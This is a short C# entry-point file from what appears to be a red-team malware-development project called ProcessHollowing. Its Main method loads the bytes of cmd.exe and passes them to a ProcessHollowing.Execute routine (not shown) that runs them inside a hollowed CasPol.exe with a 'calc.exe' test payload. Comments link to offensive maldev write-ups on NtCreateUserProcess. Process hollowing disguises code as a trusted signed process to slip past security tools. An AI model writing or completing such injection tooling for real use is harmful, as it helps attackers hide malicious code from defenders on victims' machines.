using System.IO;

namespace ProcessHollowing
{
    internal class Program
    {
        static void Main(string[] args)
        {
          
            
            ProcessHollowing.Execute(File.ReadAllBytes("c:\\windows\\system32\\cmd.exe"), "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CasPol.exe", "/c calc.exe");
        }
    }
    //https://captmeelo.com/redteam/maldev/2022/05/10/ntcreateuserprocess.html
    //https://offensivedefence.co.uk/posts/ntcreateuserprocess/
}
